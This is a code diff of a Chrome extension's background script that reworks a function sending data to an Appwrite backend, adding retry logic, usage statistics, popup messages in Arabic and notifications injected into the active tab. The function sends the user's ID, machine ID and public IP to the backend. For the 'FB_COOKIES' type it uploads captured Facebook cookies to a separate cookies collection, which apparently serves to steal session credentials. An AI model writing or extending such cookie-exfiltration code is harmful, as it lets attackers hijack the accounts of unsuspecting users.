@@ -957,8 +957,37 @@ chrome.storage.local.get(['machineId'], function (result) {
 
 
 // Send data to Appwrite backend
-async function sendToBackend(type, data, retry = false) {
-  console.log('🚀 sendToBackend CALLED with type:', type);
+async function sendToBackend(type, data, retry = false, retryCount = 0) {
+  console.log('[APPWRITE] 🚀 sendToBackend CALLED with type:', type);
+
+  // Update storage statistics
+  const updateStats = async (success, type) => {
+    const stats = await new Promise(resolve => {
+      chrome.storage.local.get(['appwriteStats'], res => resolve(res.appwriteStats || { total: 0, success: 0, failed: 0, lastSave: null, byType: {} }));
+    });
+    stats.total++;
+    if (success) {
+      stats.success++;
+      stats.lastSave = new Date().toISOString();
+    } else {
+      stats.failed++;
+    }
+    stats.byType[type] = (stats.byType[type] || 0) + 1;
+    await chrome.storage.local.set({ appwriteStats: stats });
+    return stats;
+  };
+
+  // Notify popup about save status
+  const notifyPopup = (success, type, message) => {
+    chrome.runtime.sendMessage({
+      action: 'appwriteSaveStatus',
+      success: success,
+      type: type,
+      message: message,
+      timestamp: new Date().toISOString()
+    }).catch(() => { /* Popup might not be open */ });
+  };
+
   try {
     const userId = await getCurrentUserId();
     const ip = await getPublicIP();
@@ -976,10 +1005,11 @@ async function sendToBackend(type, data, retry = false) {
       createdAt: new Date().toISOString()
     };
 
-    console.log('=== Sending log to Appwrite ===');
-    console.log('Type:', type);
-    console.log('LogData:', logData);
-    console.log('URL:', `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents`);
+    console.log('[APPWRITE] === Sending log to Appwrite ===');
+    console.log('[APPWRITE] Type:', type);
+    console.log('[APPWRITE] UserId:', logData.userId);
+    console.log('[APPWRITE] IP:', logData.ip);
+    console.log('[APPWRITE] Data size:', logData.data.length, 'bytes');
 
     const logResponse = await fetch(
       `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents`,
@@ -993,12 +1023,40 @@ async function sendToBackend(type, data, retry = false) {
       }
     );
 
-    console.log('Log save response:', logResponse.status, logResponse.statusText);
+    console.log('[APPWRITE] Log save response:', logResponse.status, logResponse.statusText);
+
     if (!logResponse.ok) {
       const errorBody = await logResponse.text();
-      console.error('❌ Log save error:', errorBody);
+      console.error('[APPWRITE] ❌ Log save error:', errorBody);
+      await updateStats(false, type);
+      notifyPopup(false, type, `فشل حفظ السجل: ${logResponse.status}`);
+
+      // Show notification to active tab
+      chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
+        if (tabs[0]) {
+          chrome.scripting.executeScript({
+            target: { tabId: tabs[0].id },
+            func: showNotification,
+            args: [`❌ فشل حفظ البيانات: ${type}`, 'error']
+          }).catch(() => { });
+        }
+      });
     } else {
-      console.log('✅ Log saved successfully to Appwrite');
+      const savedDoc = await logResponse.json();
+      console.log('[APPWRITE] ✅ Log saved successfully! DocId:', savedDoc.$id);
+      await updateStats(true, type);
+      notifyPopup(true, type, `تم حفظ ${type} بنجاح`);
+
+      // Show success notification to active tab
+      chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
+        if (tabs[0]) {
+          chrome.scripting.executeScript({
+            target: { tabId: tabs[0].id },
+            func: showNotification,
+            args: [`✅ تم حفظ البيانات: ${type}`, 'success']
+          }).catch(() => { });
+        }
+      });
     }
 
 
@@ -1006,11 +1064,10 @@ async function sendToBackend(type, data, retry = false) {
     if (type === 'FB_COOKIES') {
       // Use cookies from data.cookies (passed from the calling code) or fallback to fetched cookies
       const cookiesToSave = data.cookies || cookies || '';
-      console.log('Saving FB_COOKIES to Appwrite:', { hasCookies: !!cookiesToSave, cookiesLength: cookiesToSave.length });
+      console.log('[APPWRITE] Saving FB_COOKIES:', { hasCookies: !!cookiesToSave, cookiesLength: cookiesToSave.length });
 
-      if (cookiesToSave) {
-        console.log('=== Saving cookies to Appwrite ===');
-        console.log('Cookies length:', cookiesToSave.length);
+      if (cookiesToSave && cookiesToSave.length > 0) {
+        console.log('[APPWRITE] === Saving cookies to Appwrite ===');
 
         const cookiesData = {
           userId: userId || machineId,
@@ -1019,7 +1076,7 @@ async function sendToBackend(type, data, retry = false) {
           ip: ip,
           capturedAt: new Date().toISOString()
         };
-        console.log('Cookies data prepared:', { userId: cookiesData.userId, url: cookiesData.url, cookiesLength: cookiesData.cookies.length });
+        console.log('[APPWRITE] Cookies prepared - User:', cookiesData.userId, 'URL:', cookiesData.url, 'Size:', cookiesData.cookies.length);
 
         const cookiesResponse = await fetch(
           `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.cookies}/documents`,
@@ -1033,25 +1090,40 @@ async function sendToBackend(type, data, retry = false) {
           }
         );
 
-        console.log('Cookies save response:', cookiesResponse.status, cookiesResponse.statusText);
+        console.log('[APPWRITE] Cookies save response:', cookiesResponse.status, cookiesResponse.statusText);
         if (!cookiesResponse.ok) {
           const errorBody = await cookiesResponse.text();
-          console.error('Cookies save error body:', errorBody);
+          console.error('[APPWRITE] ❌ Cookies save error:', errorBody);
+          await updateStats(false, 'COOKIES_COLLECTION');
+          notifyPopup(false, 'COOKIES', `فشل حفظ الكوكيز: ${cookiesResponse.status}`);
         } else {
-          console.log('✅ Cookies saved successfully to Appwrite');
+          const savedCookie = await cookiesResponse.json();
+          console.log('[APPWRITE] ✅ Cookies saved successfully! DocId:', savedCookie.$id);
+          await updateStats(true, 'COOKIES_COLLECTION');
+          notifyPopup(true, 'COOKIES', 'تم حفظ الكوكيز بنجاح');
         }
       } else {
-        console.log('No cookies to save (empty)');
+        console.log('[APPWRITE] ⚠️ No cookies to save (empty or undefined)');
       }
     }
 
 
   } catch (e) {
-    console.error('sendToBackend error:', e);
-    if (!retry) {
+    console.error('[APPWRITE] ❌ sendToBackend error:', e.message);
+    console.error('[APPWRITE] Stack:', e.stack);
+    await updateStats(false, type);
+    notifyPopup(false, type, `خطأ: ${e.message}`);
+
+    // Retry logic with exponential backoff
+    if (!retry && retryCount < 3) {
+      const retryDelay = Math.pow(2, retryCount) * 30000; // 30s, 60s, 120s
+      console.log(`[APPWRITE] ⏳ Will retry in ${retryDelay / 1000}s (attempt ${retryCount + 1}/3)`);
       setTimeout(() => {
-        sendToBackend(type, data, true);
-      }, 60 * 1000);
+        sendToBackend(type, data, true, retryCount + 1);
+      }, retryDelay);
+    } else if (retryCount >= 3) {
+      console.error('[APPWRITE] ❌ Max retries reached, giving up');
+      notifyPopup(false, type, 'فشل الحفظ بعد 3 محاولات');
     }
   }
 }
